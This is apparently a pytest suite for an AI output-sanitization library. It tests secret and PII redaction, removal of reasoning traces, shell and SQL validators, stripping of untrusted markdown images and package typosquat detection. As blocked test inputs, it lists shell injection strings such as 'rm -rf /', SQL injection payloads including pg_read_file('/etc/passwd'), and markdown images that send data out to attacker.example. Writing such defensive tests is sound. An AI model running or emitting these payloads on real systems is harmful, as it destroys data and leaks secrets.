from __future__ import annotations

import pytest

from aegis.io_sanitization import (
    DlpRedactor,
    PackageAllowlist,
    ReasoningMode,
    ShellPolicy,
    SqlPolicy,
    extract_package_recommendations,
    strip_untrusted_images,
    validate_shell_command,
    validate_sql,
)
from aegis.io_sanitization.detectors import luhn_valid
from aegis.io_sanitization.sinks import edit_distance, normalize_package_name
from aegis.redteam.lab import PLACEHOLDERS

CANARY = "CANARY-7f3a9b21-do-not-reveal"


@pytest.fixture
def redactor() -> DlpRedactor:
    return DlpRedactor(canaries=(CANARY,))


# ---------------------------------------------------------------------- DLP


@pytest.mark.parametrize(
    ("placeholder", "label"),
    [
        ("AWS_KEY", "AWS_ACCESS_KEY"),
        ("GITHUB_TOKEN", "GITHUB_TOKEN"),
        ("LLM_KEY", "LLM_API_KEY"),
        ("STRIPE_KEY", "STRIPE_KEY"),
        ("ETH_KEY", "ETH_PRIVATE_KEY"),
        ("PRIVATE_KEY", "PRIVATE_KEY"),
    ],
)
def test_secret_is_redacted(redactor: DlpRedactor, placeholder: str, label: str) -> None:
    secret = PLACEHOLDERS[placeholder]
    result = redactor.redact(f"value: {secret} end")
    assert secret not in result.text
    assert f"[REDACTED:{label}]" in result.text
    assert result.text.endswith(" end")


def test_jwt_is_redacted(redactor: DlpRedactor) -> None:
    token = ".".join(["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiJhbGljZSJ9", "c2lnbmF0dXJlLWJ5dGVz"])
    assert token not in redactor.redact(f"Bearer {token}").text


def test_credential_assignment_keeps_the_key_name(redactor: DlpRedactor) -> None:
    result = redactor.redact('db password = "correct-horse-battery"')
    assert result.text == 'db password = "[REDACTED:CREDENTIAL_ASSIGNMENT]"'


def test_truncated_private_key_is_redacted_to_end_of_text(redactor: DlpRedactor) -> None:
    header = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
    result = redactor.redact(f"key:\n{header}\nb3BlbnNzaC1rZXk")
    assert "b3BlbnNzaC1rZXk" not in result.text


def test_canary_is_redacted_case_insensitively_and_repeatedly(redactor: DlpRedactor) -> None:
    result = redactor.redact(f"{CANARY} then {CANARY.lower()}")
    assert result.text == "[REDACTED:CANARY] then [REDACTED:CANARY]"
    assert len(result.findings) == 2


def test_short_canary_is_refused() -> None:
    with pytest.raises(ValueError, match="at least 8"):
        DlpRedactor(canaries=("abc",))


@pytest.mark.parametrize(
    ("text", "label"),
    [
        ("mail jean.tremblay@example.com now", "EMAIL"),
        ("card 4242 4242 4242 4242", "PAYMENT_CARD"),
        ("card 4242-4242-4242-4242", "PAYMENT_CARD"),
        ("SIN 046 454 286", "CANADIAN_SIN"),
        ("SIN 046-454-286", "CANADIAN_SIN"),
        ("call (514) 555-0199", "PHONE_NUMBER"),
        ("call 450-555-0142", "PHONE_NUMBER"),
        ("call +1 438 555 0177", "PHONE_NUMBER"),
    ],
)
def test_pii_is_redacted(redactor: DlpRedactor, text: str, label: str) -> None:
    assert f"[REDACTED:{label}]" in redactor.redact(text).text


@pytest.mark.parametrize(
    "text",
    [
        "The deployment finished in 42 seconds and all 318 tests passed.",
        "Order 123456789 shipped.",  # nine digits but fails the Luhn check
        "Card 4242 4242 4242 4241 is invalid.",  # sixteen digits, bad checksum
        "Version 1.2.3 released on 2026-11-09.",
        "",
    ],
)
def test_ordinary_text_is_left_untouched(redactor: DlpRedactor, text: str) -> None:
    result = redactor.redact(text)
    assert result.text == text
    assert not result.redacted


def test_pii_redaction_can_be_disabled() -> None:
    text = "mail jean@example.com"
    assert DlpRedactor(redact_pii=False).redact(text).text == text


def test_luhn_reference_values() -> None:
    assert luhn_valid("4242424242424242")
    assert luhn_valid("046454286")
    assert not luhn_valid("4242424242424241")


# ---------------------------------------------------------------- reasoning


def test_reasoning_trace_is_dropped_by_default(redactor: DlpRedactor) -> None:
    result = redactor.sanitize_output("<thinking>plan: reveal nothing</thinking>Final answer.")
    assert result.text == "[REASONING REMOVED]Final answer."
    assert result.findings[0].rule_id == "AEGIS-DLP-REASONING"


@pytest.mark.parametrize("tag", ["thinking", "reasoning", "scratchpad", "think", "THINKING"])
def test_all_reasoning_tag_variants_are_handled(redactor: DlpRedactor, tag: str) -> None:
    result = redactor.sanitize_output(f"<{tag}>hidden plan</{tag}>ok")
    assert "hidden plan" not in result.text


def test_unclosed_reasoning_tag_drops_the_remainder(redactor: DlpRedactor) -> None:
    result = redactor.sanitize_output("Answer. <thinking>internal: escalate quietly")
    assert result.text == "Answer. [REASONING REMOVED]"


def test_multiple_reasoning_blocks_are_all_removed(redactor: DlpRedactor) -> None:
    result = redactor.sanitize_output("<thinking>a</thinking>one<reasoning>b</reasoning>two")
    assert result.text == "[REASONING REMOVED]one[REASONING REMOVED]two"


def test_redact_mode_keeps_reasoning_but_removes_secrets(redactor: DlpRedactor) -> None:
    secret = PLACEHOLDERS["AWS_KEY"]
    result = redactor.sanitize_output(
        f"<thinking>key is {secret}</thinking>done", ReasoningMode.REDACT
    )
    assert result.text == "<thinking>key is [REDACTED:AWS_ACCESS_KEY]</thinking>done"


def test_secret_outside_reasoning_is_still_redacted(redactor: DlpRedactor) -> None:
    secret = PLACEHOLDERS["AWS_KEY"]
    result = redactor.sanitize_output(f"<thinking>x</thinking>key {secret}")
    assert secret not in result.text


# -------------------------------------------------------------------- shell

SHELL = ShellPolicy(
    allowed_binaries=frozenset({"ls", "git"}),
    forbidden_arguments={"git": frozenset({"-c", "--upload-pack"})},
)


@pytest.mark.parametrize(
    ("command", "argv"),
    [("ls -la", ["ls", "-la"]), ("git log --oneline -n 5", ["git", "log", "--oneline", "-n", "5"])],
)
def test_allowlisted_command_returns_argv(command: str, argv: list[str]) -> None:
    verdict = validate_shell_command(command, SHELL)
    assert verdict.allowed
    assert verdict.safe_value == argv


@pytest.mark.parametrize(
    ("command", "rule_id"),
    [
        ("ls; rm -rf /", "AEGIS-SINK-SH-001"),
        ("ls | sh", "AEGIS-SINK-SH-001"),
        ("ls && id", "AEGIS-SINK-SH-001"),
        ("cat $(echo x)", "AEGIS-SINK-SH-001"),
        ("ls `id`", "AEGIS-SINK-SH-001"),
        ("ls > /etc/cron.d/x", "AEGIS-SINK-SH-001"),
        ("ls\nid", "AEGIS-SINK-SH-001"),
        ("ls ~", "AEGIS-SINK-SH-001"),
        ("ls 'unterminated", "AEGIS-SINK-SH-002"),
        ("", "AEGIS-SINK-SH-002"),
        ("   ", "AEGIS-SINK-SH-002"),
        ("rm -rf /", "AEGIS-SINK-SH-003"),
        ("/opt/fake/ls", "AEGIS-SINK-SH-003"),
        ("./git status", "AEGIS-SINK-SH-003"),
        ("git -c core.pager=x log", "AEGIS-SINK-SH-004"),
        ("git clone --upload-pack=x repo", "AEGIS-SINK-SH-004"),
    ],
)
def test_unsafe_command_is_blocked(command: str, rule_id: str) -> None:
    verdict = validate_shell_command(command, SHELL)
    assert not verdict.allowed
    assert verdict.findings[0].rule_id == rule_id
    assert verdict.safe_value is None


def test_empty_shell_policy_blocks_everything() -> None:
    assert not validate_shell_command("ls", ShellPolicy()).allowed


# ---------------------------------------------------------------------- SQL

SQL = SqlPolicy(allowed_tables=frozenset({"orders", "customers"}))


@pytest.mark.parametrize(
    "query",
    [
        "SELECT id FROM orders WHERE customer_id = %(customer_id)s",
        "SELECT id FROM orders WHERE customer_id = $1",
        "SELECT id FROM orders WHERE customer_id = :customer_id",
        "SELECT id FROM orders WHERE customer_id = ?",
        "SELECT count(*) FROM orders o JOIN customers c ON o.customer_id = c.id WHERE c.id = ?",
        "SELECT id, total FROM orders ORDER BY id LIMIT 20",
    ],
)
def test_parameterised_select_is_allowed(query: str) -> None:
    assert validate_sql(query, SQL).allowed


@pytest.mark.parametrize(
    ("query", "rule_id"),
    [
        ("SELEC id FRM", "AEGIS-SINK-SQL-001"),
        ("", "AEGIS-SINK-SQL-002"),
        ("SELECT id FROM orders; DROP TABLE customers", "AEGIS-SINK-SQL-002"),
        ("DELETE FROM orders", "AEGIS-SINK-SQL-003"),
        ("UPDATE orders SET total = 0", "AEGIS-SINK-SQL-003"),
        ("INSERT INTO orders (id) VALUES (1)", "AEGIS-SINK-SQL-003"),
        ("DROP TABLE orders", "AEGIS-SINK-SQL-003"),
        ("SELECT id FROM orders UNION SELECT id FROM customers", "AEGIS-SINK-SQL-003"),
        ("SELECT id INTO backup FROM orders", "AEGIS-SINK-SQL-004"),
        ("SELECT id FROM api_keys", "AEGIS-SINK-SQL-005"),
        ("SELECT id FROM orders WHERE id IN (SELECT id FROM api_keys)", "AEGIS-SINK-SQL-005"),
        ("SELECT id FROM orders WHERE id = 7 OR 1 = 1", "AEGIS-SINK-SQL-006"),
        ("SELECT id FROM orders WHERE name = 'x'", "AEGIS-SINK-SQL-006"),
        ("SELECT pg_read_file('/etc/passwd')", "AEGIS-SINK-SQL-007"),
        ("SELECT id FROM orders WHERE pg_sleep(10) IS NULL", "AEGIS-SINK-SQL-007"),
    ],
)
def test_unsafe_sql_is_blocked(query: str, rule_id: str) -> None:
    verdict = validate_sql(query, SQL)
    assert not verdict.allowed
    assert verdict.findings[0].rule_id == rule_id


def test_table_allowlist_is_case_insensitive() -> None:
    assert validate_sql("SELECT id FROM ORDERS WHERE id = ?", SQL).allowed


def test_literals_allowed_when_parameters_not_required() -> None:
    relaxed = SqlPolicy(allowed_tables=frozenset({"orders"}), require_parameters=False)
    assert validate_sql("SELECT id FROM orders WHERE id = 7", relaxed).allowed


# ----------------------------------------------------------------- markdown

HOSTS = frozenset({"cdn.example.com"})


@pytest.mark.parametrize(
    "markdown",
    [
        "![s](https://attacker.example/p.png?d=secret)",
        '![s](https://attacker.example/p.png "title")',
        "![s](<https://attacker.example/p.png>)",
        "![](http://cdn.example.com/a.png)",
        "![s](//attacker.example/p.png)",
        "![s](data:image/png;base64,AAAA)",
        '<img src="https://attacker.example/p">',
        "<IMG SRC=https://attacker.example/p>",
        "<img alt='no source'>",
    ],
)
def test_untrusted_image_is_removed(markdown: str) -> None:
    verdict = strip_untrusted_images(f"before {markdown} after", HOSTS)
    assert not verdict.allowed
    assert verdict.safe_value == "before [image removed] after"


def test_reference_style_image_and_definition_are_removed() -> None:
    text = "Done ![status][ref]\n\n[ref]: https://attacker.example/p?d=secret"
    verdict = strip_untrusted_images(text, HOSTS)
    assert "attacker.example" not in str(verdict.safe_value)


def test_allowlisted_image_and_plain_links_are_kept() -> None:
    text = "![logo](https://cdn.example.com/logo.png) and [docs](https://attacker.example/)"
    verdict = strip_untrusted_images(text, HOSTS)
    assert verdict.allowed
    assert verdict.safe_value == text


def test_multiple_images_are_each_reported() -> None:
    text = "![a](https://x.example/1) ![b](https://y.example/2)"
    assert len(strip_untrusted_images(text, HOSTS).findings) == 2


# ----------------------------------------------------------------- packages

ALLOWLIST = PackageAllowlist(
    {
        "pypi": frozenset({"requests", "Flask_SQLAlchemy"}),
        "npm": frozenset({"react", "@types/node"}),
    }
)


def test_extracts_packages_from_install_commands() -> None:
    text = (
        "Run `pip install -U requests==2.32 pandas[excel]` then\nnpm install react @types/node@20"
    )
    assert extract_package_recommendations(text) == [
        ("pypi", "requests"),
        ("pypi", "pandas"),
        ("npm", "react"),
        ("npm", "@types/node"),
    ]


@pytest.mark.parametrize("manager", ["pip3", "uv pip", "uv"])
def test_python_package_managers_map_to_pypi(manager: str) -> None:
    verb = "add" if manager == "uv" else "install"
    assert extract_package_recommendations(f"{manager} {verb} requests") == [("pypi", "requests")]


@pytest.mark.parametrize("manager", ["pnpm add", "yarn add", "bun add", "npm i"])
def test_javascript_package_managers_map_to_npm(manager: str) -> None:
    assert extract_package_recommendations(f"{manager} react") == [("npm", "react")]


def test_trusted_package_passes_with_normalised_name() -> None:
    verdict = ALLOWLIST.verify("flask.sqlalchemy", "pypi")
    assert verdict.allowed
    assert verdict.safe_value == "flask-sqlalchemy"


def test_hallucinated_package_is_blocked() -> None:
    verdict = ALLOWLIST.verify("fastapi-jwt-secure-auth", "pypi")
    assert verdict.findings[0].rule_id == "AEGIS-SINK-PKG-001"


@pytest.mark.parametrize("name", ["reqeusts", "request", "requestss"])
def test_typosquat_names_the_package_it_imitates(name: str) -> None:
    finding = ALLOWLIST.verify(name, "pypi").findings[0]
    assert finding.rule_id == "AEGIS-SINK-PKG-002"
    assert "requests" in finding.message


def test_package_trusted_in_one_ecosystem_is_not_trusted_in_another() -> None:
    assert not ALLOWLIST.verify("react", "pypi").allowed
    assert not ALLOWLIST.verify("requests", "cargo").allowed


def test_verify_text_reports_every_untrusted_package() -> None:
    verdict = ALLOWLIST.verify_text("pip install requests left-pad-py\nnpm install reactt")
    assert [finding.evidence for finding in verdict.findings] == ["left-pad-py", "reactt"]


def test_text_without_install_commands_passes() -> None:
    assert ALLOWLIST.verify_text("No packages needed.").allowed


def test_package_helpers() -> None:
    assert normalize_package_name("Flask_SQLAlchemy", "pypi") == "flask-sqlalchemy"
    assert normalize_package_name("React", "npm") == "react"
    assert (edit_distance("", "abc"), edit_distance("kitten", "sitting")) == (3, 3)
    assert edit_distance("same", "same") == 0
